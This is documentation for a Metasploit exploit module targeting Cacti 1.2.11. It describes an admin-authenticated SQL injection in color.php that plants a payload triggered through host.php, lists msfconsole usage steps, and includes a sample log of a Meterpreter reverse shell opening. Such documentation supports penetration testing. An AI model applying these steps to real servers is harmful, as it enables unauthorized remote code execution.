## Vulnerable Application

### Description

This module allows an attacker with a privileged Cacti account to start a reverse shell using an sql injection
in the `filter` parameter of `color.php`. This then allows to set the `path_php_binary` field in `user_auth`
sql table of Cacti with a malicious payload. Finally that payload is triggered by a call to `host.php`

### Installation

Vulnerable versions of Cacti can be downloaded from [here](https://www.cacti.net/downloads/).
As it requires some work to configure it, you can use this [docker file](https://hub.docker.com/r/waperez/cacti)
(as long as it is not updated and remains a 1.2.11 version of Cacti)

## Verification Steps

List the steps needed to make sure this thing works

1. Start `msfconsole`
2. `use exploit/linux/http/cacti_authenticated_rce`
3. `set USERNAME <admin_username>`
4. `set PASSWORD <admin_password>`
5. `set TARGETURI <base_path_cacti>` if the base path of Cacti web server is different from `/`
6. `check` to check if the targeted Cacti server is vulnerable
7. `run` the module to exploit the vulnerability and start a reverse shell

## Options

### USERNAME

Set the USERNAME of your admin account.

### PASSWORD

Set the PASSWORD of your admin account.

## Scenarios

This module was successfully tested on Debian 10 with Cacti 1.2.11. See the following output :

```
msf6 exploit(cacti_rce) > run

[*] Started reverse TCP handler on X.X.X.X:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] Version 1.2.11 of Cacti found !
[+] The target is vulnerable.
[+] We successfully logged in !
[*] Using URL: http://0.0.0.0:8081/OOuyTjGJsbK
[*] Local IP: http://X.X.X.X:8081/OOuyTjGJsbK
[*] Client Y.Y.Y.Y (curl/7.58.0) requested /OOuyTjGJsbK
[*] Sending payload to Y.Y.Y.Y (curl/7.58.0)
[*] Sending stage (3012548 bytes) to Y.Y.Y.Y
[*] Meterpreter session 12 opened (X.X.X.X:4444 -> Y.Y.Y.Y:46828) at 2021-06-15 13:42:19 +0200
[*] Payload triggered !
[*] Command Stager progress - 100.00% done (117/117 bytes)
[*] Server stopped.

meterpreter >
```
